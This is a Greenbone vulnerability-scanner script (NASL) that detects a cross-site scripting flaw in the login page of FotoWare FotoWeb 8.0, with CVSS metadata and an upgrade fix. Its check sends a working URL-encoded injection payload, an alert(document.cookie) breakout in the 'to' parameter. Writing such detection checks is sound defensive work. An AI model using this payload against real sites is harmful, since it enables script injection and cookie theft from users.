# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:fotoware:fotoweb";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.808279");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2016-08-04 13:00:10 +0530 (Thu, 04 Aug 2016)");
  script_name("Fotoware Fotoweb Cross-site Scripting Vulnerability");

  script_tag(name:"summary", value:"Fotoware Fotoweb is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check
  whether its able to read cookie value or not.");

  script_tag(name:"insight", value:"The flaw exists due to an insufficient
  sanitization of 'to' parameter in 'login' page.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to create a specially crafted request that would execute arbitrary
  script code in a user's browser session within the trust relationship between
  their browser and the server.");

  script_tag(name:"affected", value:"Fotoware Fotoweb version 8.0.");

  script_tag(name:"solution", value:"Upgrade to FotoWeb 8 Feature Release 8 or
  later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/138106/Fotoware-Fotoweb-8.0-Cross-Site-Scripting.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_fotoware_fotoweb_detect.nasl");
  script_mandatory_keys("Fotoware/Fotoweb/Installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://fotoware.com");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if(!fbPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:fbPort)){
  exit(0);
}

url = dir + '/views/login?to=/fotoweb/%22;}%20else%20{%20alert%28document.cookie%29;%20}' +
            '%20if%20%28inIframe%28%29%29%20{%20var%20relleno=%22';

if(http_vuln_check(port:fbPort, url:url, check_header:TRUE,
                   pattern:"alert\(document.cookie\);",
                   extra_check:make_list("Log in to FotoWeb", ">Password")))
{
  report = http_report_vuln_url(port:fbPort, url:url);
  security_message(port:fbPort, data:report);
  exit(0);
}

exit(99);
